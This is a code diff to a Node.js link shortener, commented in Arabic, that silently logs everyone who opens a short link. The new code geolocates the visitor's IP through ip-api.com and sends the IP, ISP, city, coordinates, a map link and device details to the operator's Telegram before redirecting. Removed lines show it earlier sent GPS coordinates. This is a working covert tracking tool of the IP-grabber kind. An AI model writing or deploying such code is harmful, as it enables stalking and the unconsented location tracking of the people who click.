@@ -19,7 +19,26 @@ function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
 }
 
-async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
+async function getLocationFromIP(ip) {
+  try {
+    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
+    if (res.data && res.data.status === 'success') {
+      return {
+        country: res.data.country,
+        city: res.data.city,
+        region: res.data.regionName,
+        latitude: res.data.lat,
+        longitude: res.data.lon,
+        isp: res.data.isp
+      };
+    }
+  } catch (e) {
+    console.log('IP lookup error:', e.message);
+  }
+  return null;
+}
+
+async function sendToTelegram(ip, shortCode, originalUrl, userAgent, location) {
   try {
     let msg = `
 🔗 رابط فُتح!
@@ -29,16 +48,24 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
 🔌 IP: ${ip}
 `;
 
-    if (gps && gps.lat && gps.lng) {
+    if (location) {
       msg += `
-📍 Latitude: ${gps.lat}
-📍 Longitude: ${gps.lng}
-📏 Accuracy: ±${gps.accuracy.toFixed(0)}m
-🗺️ Maps: https://maps.google.com/?q=${gps.lat},${gps.lng}
+🌍 ISP: ${location.isp || 'N/A'}
+🏳️ الدولة: ${location.country || 'N/A'}
+🏙️ المدينة: ${location.city || 'N/A'}
+🗺️ المنطقة: ${location.region || 'N/A'}
+📊 Latitude: ${location.latitude || 'N/A'}
+📊 Longitude: ${location.longitude || 'N/A'}
+🗺️ الخريطة: https://maps.google.com/?q=${location.latitude},${location.longitude}
+`;
+    } else {
+      msg += `
+⚠️ الموقع: لم يتم التحديد
 `;
     }
 
     msg += `
+━━━━━━━━━━━
 🖥️ Device: ${userAgent.substring(0, 60)}
 ⏰ ${new Date().toISOString()}
     `.trim();
@@ -48,9 +75,9 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
       { timeout: 5000 }
     );
     
-    console.log('[SUCCESS] Telegram message sent');
+    console.log('[TG] Message sent');
   } catch (err) {
-    console.error('[ERROR] Telegram:', err.message);
+    console.error('[TG] Error:', err.message);
   }
 }
 
@@ -65,8 +92,8 @@ app.post('/api/shorten', (req, res) => {
   res.json({ shortened: shortenedUrl, code: shortCode });
 });
 
-// الرابط المختصر — Server-side redirect + Logging
-app.get('/:code', (req, res) => {
+// الرابط المختصر
+app.get('/:code', async (req, res) => {
   const { code } = req.params;
   
   if (!linkStorage[code]) {
@@ -79,9 +106,14 @@ app.get('/:code', (req, res) => {
 
   linkStorage[code].clicks++;
 
-  // تسجيل فوري بدون انتظار
-  console.log(`[REDIRECT] Code: ${code}, IP: ${ip}`);
-  sendToTelegram(ip, code, originalUrl, userAgent, null);
+  console.log(`[LOG] Code: ${code}, IP: ${ip}`);
+  
+  // احصل على الموقع من IP
+  const location = await getLocationFromIP(ip);
+  console.log(`[LOG] Location:`, location);
+  
+  // أرسل للتلجرام
+  sendToTelegram(ip, code, originalUrl, userAgent, location);
 
   // Redirect مباشر
   res.redirect(originalUrl);
